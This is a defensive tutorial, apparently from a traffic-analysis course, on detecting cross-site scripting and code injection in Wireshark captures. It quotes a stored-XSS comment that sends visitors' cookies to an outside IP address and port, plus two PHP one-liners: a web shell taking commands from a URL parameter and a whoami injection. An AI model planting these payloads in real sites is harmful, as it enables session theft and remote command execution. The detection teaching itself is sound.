# Cross-Site Scripting (XSS) & Code Injection Detection

**Related PCAP File(s)**:
* `XSS_Simple.pcapng`

---

Suppose we were looking through our HTTP requests and noticed that a good amount of requests were being sent to an internal "server," we did not recognize. This could be a clear indication of cross-site scripting. Let's take the following output for example.

![Wireshark capture showing HTTP requests with cookies between 192.168.10.3 and 192.168.10.5.](images/1-XSS.png)

We might notice alot of values being sent over, and in real cases this might not be as obvious that these are user's cookies/tokens. Instead, it might even be encoded or encrypted while it is in transit. Essentially speaking, cross-site scripting works through an attacker injecting malicious javascript or script code into one of our web pages through user input. When other users visit our web server their browsers will execute this code. Attackers in many cases will utilize this technique to steal tokens, cookies, session values, and more. If we were to follow one of these requests it would look like the following.

![HTTP GET request with cookie parameter, resulting in 404 error response.](images/2-XSS_.png)

Getting down to the root of where this code is originating can be somewhat tricky. However, suppose we had a user comment area on our web server. We might notice one of the comments looks like the following.

```javascript
<script>
  window.addEventListener("load", function() {
    const url = "http://192.168.0.19:5555";
    const params = "cookie=" + encodeURIComponent(document.cookie);
    const request = new XMLHttpRequest();
    request.open("GET", url + "?" + params);
    request.send();
  });
</script>
```

This would be successful cross-site scripting from the attacker, and as such we would want to remove this comment quickly, and even in most cases bring our server down to fix the issue before it persists. We might also notice in some cases, that an attacker might attempt to inject code into these fields like the following two examples.

In order for them to get command and control through PHP.

```php
<?php system($_GET['cmd']); ?>
```

Or to execute a single command with PHP:

```php
<?php echo `whoami` ?>
```

#### Preventing XSS and Code Injection

In order to prevent these threats after we detect them, we can do the following.

1. `Sanitize and handle user input in an acceptable manner.`

2. `Do not interpret user input as code.`
